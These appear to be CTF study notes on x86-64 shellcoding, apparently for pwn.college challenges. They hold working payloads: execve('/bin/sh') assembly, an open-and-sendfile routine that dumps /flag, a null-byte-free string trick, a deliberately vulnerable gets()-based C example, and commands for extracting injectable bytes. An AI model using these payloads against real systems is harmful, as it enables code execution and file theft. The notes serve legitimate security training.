
- Shellcode = **raw machine code bytes** you inject into a vulnerable program so the CPU executes them directly.
- Requires the target memory region to be **executable** (stack/heap with NX off). If NX is on, shellcoding alone won't work — you'd need ROP instead.
- **Goal**: Find a way to write your bytes into memory ↓ Redirect execution (RIP) to those bytes ↓ Your bytes run as CPU instructions ↓ Spawn a shell / read the flag ↓ Get flag

---
### <span style="color:rgb(146, 208, 80)">0- When does shellcoding actually get triggered?</span>

Shellcoding isn't its own bug, it's the **payload** you drop in once some other bug lets you redirect execution. It works whenever attacker-controlled data ends up being treated as something the CPU jumps to or calls. Two common triggers:

- **Return address overwrite** — classic stack buffer overflow, overwrite the saved return address so `ret` jumps into your shellcode.
- **Function pointer overwrite** — a variable/argument that's supposed to hold a function pointer gets overwritten (or swapped) with attacker data, and later gets `call`ed.

Example of the function-pointer case (classic pwn.college demo):

```c
void hello(char *name, void (*bye_func)()) {
    printf("Hello %s!\n", name);
    bye_func();               // calls whatever address is in bye_func
}

int main(int argc, char **argv) {
    char name[1024];
    gets(name);                // unbounded input, fully attacker-controlled

    if (rand() % 2) hello(bye1, name);   // normal: bye1 is a real function pointer
    else             hello(name, bye2);  // BUG: attacker's buffer fills the bye_func slot!
}
```

In the buggy branch, `name` (your raw input) lands in the `bye_func` parameter. So `bye_func()` doesn't call a real function — it jumps to whatever address your input put there. If that's your shellcode's address (or your shellcode itself), you win.

Two conditions always need to hold for shellcoding to work:
1. You can **redirect execution** to an address you control (via one of the vectors above).
2. That address is in **executable memory** (NX has to be off — otherwise the CPU refuses to run it).

---
### <span style="color:rgb(146, 208, 80)">1- Why "shell"code?</span>

Goal is usually arbitrary command execution. Classic target: `execve("/bin/sh", NULL, NULL)`.

```asm
mov rax, 59            ; syscall number of execve
lea rdi, [rip+binsh]   ; rdi = pointer to "/bin/sh" string
mov rsi, 0             ; argv = NULL
mov rdx, 0             ; envp = NULL
syscall                ; trigger execve

binsh:
.string "/bin/sh"
```

Common x86-64 syscall numbers to remember:

|Syscall|rax|Args (rdi, rsi, rdx, r10)|
|---|---|---|
|`read`|0|fd, buf, count|
|`write`|1|fd, buf, count|
|`open`|2|path, flags, mode|
|`execve`|59|path, argv, envp|
|`exit`|60|status|
|`sendfile`|40|out_fd, in_fd, offset, count|
(Find more with `man 2 syscall` )

---

### <span style="color:rgb(146, 208, 80)">2- Non-shell shellcode (reading a flag file directly)</span>

write shellcode that **reads `/flag` and prints it**.

```asm
mov rbx, 0x00000067616c662f  ; "/flag" packed into a register (little-endian)
push rbx
mov rax, 2                   ; syscall: open
mov rdi, rsp                 ; rdi = pointer to "/flag" on stack
mov rsi, 0                   ; O_RDONLY
syscall                      ; open("/flag", O_RDONLY)  -> fd in rax

mov rdi, 1                   ; output fd = stdout
mov rsi, rax                 ; input fd = fd returned by open
mov rdx, 0                   ; offset = 0
mov r10, 1000                ; count = 1000 bytes
mov rax, 40                  ; syscall: sendfile
syscall                      ; sendfile(1, fd, 0, 1000)

mov rax, 60                  ; syscall: exit
syscall
```

This pattern (`open` → `read`/`sendfile` → `write`) is reusable any time you need to leak a file's contents without a shell.

---

### <span style="color:rgb(146, 208, 80)">3- Building a string without `.string` (avoids null-byte/section issues)</span>

```asm
mov rbx, 0x0068732f6e69622f  ; "/bin/sh\0" packed as an immediate (read right-to-left)
push rbx                     ; pushes it onto the stack
mov rdi, rsp                 ; rdi now points at "/bin/sh"
```

Handy when there's no writable section for your string, or the challenge won't let a null byte sit in the middle of your shellcode.

---

### <span style="color:rgb(146, 208, 80)">4- Building shellcode (assemble → extract raw bytes)</span>

Write shellcode as a standalone assembly file:

```asm
.global _start
_start:
.intel_syntax noprefix
mov rax, 59
lea rdi, [rip+binsh]
mov rsi, 0
mov rdx, 0
syscall
binsh:
.string "/bin/sh"
```

Assemble + link into a bare ELF, then rip out just the `.text` bytes:

```bash
gcc -nostdlib -static shellcode.s -o shellcode-elf
objcopy --dump-section .text=shellcode-raw shellcode-elf
```

`shellcode-raw` now contains the raw machine code bytes — this is exactly what you inject into the target program (e.g. `payload = open("shellcode-raw","rb").read()` in pwntools).

---
### <span style="color:rgb(146, 208, 80)">5- Debugging shellcode</span>

**High-level check — strace** (see which syscalls actually fire):

```bash
strace ./shellcode-elf
```

**Low-level — gdb** (no source code, so use raw memory/register inspection):

```bash
gdb ./shellcode-elf
```

|Command|What it does|
|---|---|
|`x/5i $rip`|disassemble next 5 instructions|
|`x/gx $rsp`|examine a qword (8 bytes) at RSP|
|`si` / `ni`|step one instruction (into / over a `call`)|
|`break *0x400000`|breakpoint at raw address|
|`run` / `continue`|normal execution control|

You can also hardcode a breakpoint directly into your shellcode with `int3` — handy at the very start to catch execution the instant it begins:

```asm
int3    ; traps into the debugger here
```

---

## <span style="color:rgb(146, 208, 80)">Things that go wrong:</span>

|PROBLEM|FIX|
|---|---|
|Shellcode doesn't run at all|Check the region is executable (NX?) — you need `gcc -z execstack` or a writable+exec page|
|Segfault immediately|Check register setup (`rax` = correct syscall number, args in `rdi/rsi/rdx/r10`)|
|Shellcode gets cut off early|You likely have a null byte — avoid `.string`, build strings via `mov reg, imm` + `push` instead|
|Not sure what's happening|Run `strace ./shellcode-elf` first, then `gdb` if you need more detail|
|No shell available in the challenge|Use the `open` → `sendfile` pattern to dump `/flag` to stdout instead|